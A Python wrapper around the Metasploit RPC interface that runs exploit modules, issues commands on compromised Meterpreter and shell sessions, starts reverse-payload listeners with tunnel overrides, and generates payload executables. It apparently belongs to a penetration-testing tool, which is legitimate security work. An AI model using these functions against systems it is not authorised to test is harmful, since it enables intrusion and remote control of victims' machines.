"""
Metasploit RPC Client Wrapper
Provides connection management for pymetasploit3
"""

import os
import logging

logger = logging.getLogger(__name__)

# Check if pymetasploit3 is available
try:
    from pymetasploit3.msfrpc import MsfRpcClient
    HAS_PYMSF = True
except ImportError:
    HAS_PYMSF = False
    MsfRpcClient = None


class MetasploitClient:
    """Wrapper for Metasploit RPC client with connection management"""
    
    def __init__(self):
        self.client = None
        self.host = os.getenv("MSF_HOST", "127.0.0.1")
        self.port = int(os.getenv("MSF_PORT", "55553"))
        self.password = os.getenv("MSF_PASSWORD", "msf")
        self.ssl = os.getenv("MSF_SSL", "true").lower() in ("true", "1", "yes")
    
    def connect(self, password=None, host=None, port=None, ssl=None):
        """Connect to msfrpcd"""
        if not HAS_PYMSF:
            raise ImportError("pymetasploit3 not installed")
        
        self.password = password or self.password
        self.host = host or self.host
        self.port = port or self.port
        self.ssl = ssl if ssl is not None else self.ssl
        
        try:
            self.client = MsfRpcClient(
                self.password,
                server=self.host,
                port=self.port,
                ssl=self.ssl
            )
            logger.info(f"Connected to Metasploit RPC at {self.host}:{self.port}")
            return True
        except Exception as e:
            logger.error(f"Failed to connect to Metasploit RPC: {e}")
            self.client = None
            raise
    
    def disconnect(self):
        """Disconnect from msfrpcd"""
        if self.client:
            try:
                self.client.logout()
            except:
                pass
            self.client = None
            logger.info("Disconnected from Metasploit RPC")
    
    def is_connected(self):
        """Check if connected to msfrpcd"""
        if not self.client:
            return False
        try:
            # Try to get version to verify connection
            self.client.core.version
            return True
        except:
            self.client = None
            return False
    
    def get_version(self):
        """Get Metasploit version"""
        if not self.is_connected():
            return None
        try:
            return self.client.core.version
        except:
            return None
    
    def list_modules(self, module_type="exploit"):
        """List available modules"""
        if not self.is_connected():
            return []
        try:
            if module_type == "exploit":
                return self.client.modules.exploits
            elif module_type == "auxiliary":
                return self.client.modules.auxiliary
            elif module_type == "payload":
                return self.client.modules.payloads
            elif module_type == "post":
                return self.client.modules.post
            elif module_type == "encoder":
                return self.client.modules.encoders
            elif module_type == "nop":
                return self.client.modules.nops
            else:
                return []
        except Exception as e:
            logger.error(f"Error listing modules: {e}")
            return []
    
    def search_modules(self, query, module_type=None):
        """Search for modules"""
        if not self.is_connected():
            return []
        try:
            results = []
            types_to_search = [module_type] if module_type else ["exploit", "auxiliary", "payload", "post"]
            
            for mtype in types_to_search:
                modules = self.list_modules(mtype)
                for mod in modules:
                    if query.lower() in mod.lower():
                        results.append({"type": mtype, "name": mod})
            
            return results[:50]  # Limit results
        except Exception as e:
            logger.error(f"Error searching modules: {e}")
            return []
    
    def get_sessions(self):
        """Get active sessions from Metasploit"""
        if not self.is_connected():
            return {}
        try:
            sessions = self.client.sessions.list
            return sessions if isinstance(sessions, dict) else {}
        except Exception as e:
            logger.error(f"Error getting sessions: {e}")
            return {}
    
    def get_session(self, session_id):
        """Get info for a specific session"""
        if not self.is_connected():
            return None
        try:
            sessions = self.client.sessions.list
            sid_str = str(session_id)
            if sid_str in sessions:
                return sessions[sid_str]
            return None
        except Exception as e:
            logger.error(f"Error getting session {session_id}: {e}")
            return None
    
    def kill_session(self, session_id):
        """Kill/stop a session"""
        if not self.is_connected():
            return False
        try:
            sid_str = str(session_id)
            # Try to stop the session
            result = self.client.call('session.stop', [sid_str])
            logger.info(f"Kill session {session_id} result: {result}")
            return True
        except Exception as e:
            logger.error(f"Error killing session {session_id}: {e}")
            # Return True anyway - session might already be dead
            return True
    
    def get_jobs(self):
        """Get running jobs with full info"""
        if not self.is_connected():
            return {}
        try:
            jobs = self.client.jobs.list
            # jobs.list returns {id: name} dict
            # Get more info for each job
            result = {}
            for job_id, job_name in jobs.items():
                try:
                    info = self.client.jobs.info(job_id)
                    result[job_id] = {
                        "name": info.get("name", job_name) or f"Job {job_id}",
                        "datastore": info.get("datastore", {})
                    }
                except:
                    result[job_id] = {"name": job_name or f"Job {job_id}"}
            return result
        except Exception as e:
            logger.error(f"Error getting jobs: {e}")
            return {}
    
    def run_module(self, module_type, module_name, options=None):
        """Run a Metasploit module"""
        if not self.is_connected():
            return {"error": "Not connected"}
        
        try:
            if module_type == "exploit":
                mod = self.client.modules.use("exploit", module_name)
            elif module_type == "auxiliary":
                mod = self.client.modules.use("auxiliary", module_name)
            else:
                return {"error": f"Unsupported module type: {module_type}"}
            
            # Set options
            if options:
                for key, value in options.items():
                    mod[key] = value
            
            # Execute
            result = mod.execute()
            return {"success": True, "result": result}
        except Exception as e:
            logger.error(f"Error running module: {e}")
            return {"error": str(e)}
    
    def session_command(self, session_id, command):
        """Run command on a session (generic)"""
        if not self.is_connected():
            return {"error": "Not connected"}
        
        try:
            sessions = self.client.call('session.list')
            sid = int(session_id)
            if sid not in sessions:
                return {"error": f"Session {session_id} not found"}
            
            shell = self.client.sessions.session(str(sid))
            shell.write(command)
            
            import time
            time.sleep(1)  # Wait for output
            
            output = shell.read()
            return {"success": True, "output": output}
        except Exception as e:
            logger.error(f"Error running session command: {e}")
            return {"error": str(e)}
    
    def meterpreter_run(self, session_id, command):
        """Run a meterpreter command directly - NO LLM involvement
        
        This is for direct meterpreter interaction with the remote session.
        Returns raw output only.
        """
        if not self.is_connected():
            # Try to reconnect
            try:
                self.connect()
            except:
                return "Error: Not connected to MSF"
        
        import time
        
        try:
            # Force fresh session list
            sessions = self.client.call('session.list')
            
            # Session keys are integers, convert input to int
            sid = int(session_id)
            
            if sid not in sessions:
                return f"Error: Session {session_id} not found"
            
            # Get meterpreter session - pass as string for pymetasploit3
            meterpreter = self.client.sessions.session(str(sid))
            
            # Clear any stale pending output first
            try:
                stale = meterpreter.read()
                if stale:
                    logger.debug(f"Cleared stale output: {len(stale)} bytes")
            except:
                pass
            
            # Send command
            meterpreter.write(command)
            
            # Wait for command to process - longer timeout
            time.sleep(1.0)
            
            # Read output with more retries and longer waits
            output = ""
            for attempt in range(8):
                try:
                    data = meterpreter.read()
                    if data:
                        output += data
                        time.sleep(0.3)
                    else:
                        if output:
                            break
                        time.sleep(0.5)
                except:
                    break
            
            return output.strip() if output else "(No output)"
            
        except Exception as e:
            logger.error(f"Meterpreter run error: {e}")
            return f"Error: {str(e)}"
    
    def shell_execute(self, session_id, command):
        """Execute command in a shell session - NO LLM involvement
        
        For non-meterpreter shell sessions.
        Returns raw output only.
        """
        if not self.is_connected():
            return "Error: Not connected to MSF"
        
        try:
            sessions = self.client.sessions.list
            sid_str = str(session_id)
            
            if sid_str not in sessions:
                return f"Error: Session {session_id} not found"
            
            shell = self.client.sessions.session(session_id)
            shell.write(command + "\n")  # Shell needs newline
            
            import time
            time.sleep(1)  # Shells typically need more time
            
            output = ""
            for _ in range(5):
                data = shell.read()
                if data:
                    output += data
                    time.sleep(0.5)
                else:
                    break
            
            return output.strip() if output else "(No output)"
            
        except Exception as e:
            logger.error(f"Shell execute error: {e}")
            return f"Error: {str(e)}"
    
    def start_handler(self, payload, lhost, lport, use_ssl=False, ssl_cert=None, 
                      override_lhost=None, override_lport=None, override_request_host=False):
        """Start a multi/handler listener
        
        Args:
            payload: Payload to use (e.g., 'windows/x64/meterpreter/reverse_https')
            lhost: Listen host
            lport: Listen port
            use_ssl: Enable SSL for HTTPS payloads
            ssl_cert: Path to SSL certificate (PEM file)
            override_lhost: Override LHOST for staged payloads (e.g., Cloudflare tunnel domain)
            override_lport: Override LPORT for staged payloads (e.g., 443 for Cloudflare)
            override_request_host: Set OverrideRequestHost for proper tunnel routing
        
        Returns:
            dict with job_id or error
        """
        if not self.is_connected():
            return {"error": "Not connected"}
        
        try:
            # Create handler module
            handler = self.client.modules.use("exploit", "multi/handler")
            handler["ExitOnSession"] = False  # Keep listener running after session
            
            # Create payload module and set its options
            payload_mod = self.client.modules.use("payload", payload)
            payload_mod["LHOST"] = lhost
            payload_mod["LPORT"] = lport
            
            # Override options for Cloudflare tunnel / reverse proxy setups
            if override_lhost:
                payload_mod["OverrideLHOST"] = override_lhost
                logger.info(f"OverrideLHOST set: {override_lhost}")
            if override_lport:
                payload_mod["OverrideLPORT"] = override_lport
                logger.info(f"OverrideLPORT set: {override_lport}")
            if override_request_host:
                payload_mod["OverrideRequestHost"] = True
                logger.info("OverrideRequestHost enabled")
            
            # SSL options for HTTPS payloads - only set on payload module
            if use_ssl or 'https' in payload.lower():
                if ssl_cert:
                    # Resolve to absolute path
                    import os
                    cert_path = os.path.abspath(ssl_cert)
                    if os.path.exists(cert_path):
                        # Set SSL cert options on the payload module only
                        payload_mod["HandlerSSLCert"] = cert_path
                        logger.info(f"Using SSL cert: {cert_path}")
                    else:
                        logger.warning(f"SSL cert not found: {cert_path}")
            
            # Execute handler with the payload module object
            result = handler.execute(payload=payload_mod)
            
            # Get job ID
            job_id = result.get('job_id')
            if job_id is not None:
                logger.info(f"Handler started - Job ID: {job_id}, Payload: {payload}, LHOST: {lhost}, LPORT: {lport}")
                if override_lhost:
                    logger.info(f"  Override: {override_lhost}:{override_lport}")
                return {
                    "success": True,
                    "job_id": job_id,
                    "payload": payload,
                    "lhost": lhost,
                    "lport": lport,
                    "ssl": use_ssl or 'https' in payload.lower(),
                    "ssl_cert": ssl_cert,
                    "override_lhost": override_lhost,
                    "override_lport": override_lport,
                    "override_request_host": override_request_host
                }
            else:
                return {"success": True, "result": result}
                
        except Exception as e:
            logger.error(f"Error starting handler: {e}")
            return {"error": str(e)}
    
    def stop_job(self, job_id):
        """Stop a running job"""
        if not self.is_connected():
            return {"error": "Not connected"}
        
        try:
            self.client.jobs.stop(job_id)
            logger.info(f"Stopped job {job_id}")
            return {"success": True, "job_id": job_id}
        except Exception as e:
            logger.error(f"Error stopping job: {e}")
            return {"error": str(e)}
    
    def generate_payload(self, payload, lhost, lport, format_type="exe", use_ssl=False, ssl_cert=None):
        """Generate a payload binary
        
        Args:
            payload: Payload to generate (e.g., 'windows/x64/meterpreter/reverse_https')
            lhost: Callback host
            lport: Callback port
            format_type: Output format (exe, dll, raw, ps1, etc.)
            use_ssl: Enable SSL
            ssl_cert: Path to SSL certificate
        
        Returns:
            dict with payload bytes or error
        """
        if not self.is_connected():
            return {"error": "Not connected"}
        
        try:
            p = self.client.modules.use("payload", payload)
            p["LHOST"] = lhost
            p["LPORT"] = lport
            
            # SSL options
            if use_ssl or 'https' in payload.lower():
                p["SSL"] = True
                if ssl_cert:
                    import os
                    cert_path = os.path.abspath(ssl_cert)
                    if os.path.exists(cert_path):
                        p["SSLCert"] = cert_path
            
            # Generate
            payload_data = p.generate(format_type)
            
            return {
                "success": True,
                "payload": payload,
                "format": format_type,
                "size": len(payload_data) if payload_data else 0,
                "data": payload_data
            }
        except Exception as e:
            logger.error(f"Error generating payload: {e}")
            return {"error": str(e)}
    
    # =========================================================================
    # MSF Console - Interactive msfconsole via RPC
    # =========================================================================
    
    def console_create(self):
        """Create a new MSF console"""
        if not self.is_connected():
            return {"error": "Not connected"}
        try:
            result = self.client.call('console.create')
            return {"success": True, "console_id": result.get('id'), "prompt": result.get('prompt', '')}
        except Exception as e:
            logger.error(f"Error creating console: {e}")
            return {"error": str(e)}
    
    def console_destroy(self, console_id):
        """Destroy a console"""
        if not self.is_connected():
            return {"error": "Not connected"}
        try:
            self.client.call('console.destroy', [console_id])
            return {"success": True}
        except Exception as e:
            logger.error(f"Error destroying console: {e}")
            return {"error": str(e)}
    
    def console_write(self, console_id, command):
        """Write command to console"""
        if not self.is_connected():
            return {"error": "Not connected"}
        try:
            # Commands need newline
            if not command.endswith('\n'):
                command += '\n'
            result = self.client.call('console.write', [console_id, command])
            return {"success": True, "wrote": result.get('wrote', 0)}
        except Exception as e:
            logger.error(f"Error writing to console: {e}")
            return {"error": str(e)}
    
    def console_read(self, console_id):
        """Read output from console"""
        if not self.is_connected():
            return {"error": "Not connected"}
        try:
            result = self.client.call('console.read', [console_id])
            return {
                "success": True,
                "data": result.get('data', ''),
                "prompt": result.get('prompt', ''),
                "busy": result.get('busy', False)
            }
        except Exception as e:
            logger.error(f"Error reading console: {e}")
            return {"error": str(e)}
    
    def console_execute(self, console_id, command, timeout=10):
        """Execute command and wait for output"""
        if not self.is_connected():
            return {"error": "Not connected"}
        
        import time
        
        try:
            # Write command
            write_result = self.console_write(console_id, command)
            if "error" in write_result:
                return write_result
            
            # Wait and collect output
            output = ""
            prompt = ""
            start_time = time.time()
            
            while time.time() - start_time < timeout:
                read_result = self.console_read(console_id)
                if "error" in read_result:
                    return read_result
                
                data = read_result.get('data', '')
                if data:
                    output += data
                
                prompt = read_result.get('prompt', '')
                busy = read_result.get('busy', False)
                
                if not busy and not data:
                    # Console ready and no more data
                    break
                
                time.sleep(0.2)
            
            return {
                "success": True,
                "output": output,
                "prompt": prompt
            }
        except Exception as e:
            logger.error(f"Error executing console command: {e}")
            return {"error": str(e)}
    
    def console_list(self):
        """List active consoles"""
        if not self.is_connected():
            return {"error": "Not connected"}
        try:
            result = self.client.call('console.list')
            return {"success": True, "consoles": result.get('consoles', [])}
        except Exception as e:
            logger.error(f"Error listing consoles: {e}")
            return {"error": str(e)}


# Global client instance
_msf_client = None

# Global console ID for persistent console
_msf_console_id = None


def get_msf_client(auto_connect=True):
    """Get or create Metasploit client instance with optional auto-connect"""
    global _msf_client
    if _msf_client is None:
        _msf_client = MetasploitClient()
        if auto_connect and HAS_PYMSF:
            try:
                _msf_client.connect()
                logger.info("✓ MSF RPC auto-connected")
            except Exception as e:
                logger.warning(f"MSF RPC auto-connect failed: {e}")
    return _msf_client


def get_or_create_console():
    """Get or create a persistent MSF console"""
    global _msf_console_id
    msf = get_msf_client()
    
    if not msf.is_connected():
        return None, "Not connected to MSF"
    
    # Check if existing console is still valid
    if _msf_console_id is not None:
        consoles = msf.console_list()
        if "consoles" in consoles:
            for c in consoles["consoles"]:
                if str(c.get('id')) == str(_msf_console_id):
                    return _msf_console_id, None
        # Console died, clear it
        _msf_console_id = None
    
    # Create new console
    result = msf.console_create()
    if "error" in result:
        return None, result["error"]
    
    _msf_console_id = result.get("console_id")
    return _msf_console_id, None


def destroy_console():
    """Destroy the persistent console"""
    global _msf_console_id
    if _msf_console_id is not None:
        msf = get_msf_client()
        msf.console_destroy(_msf_console_id)
        _msf_console_id = None
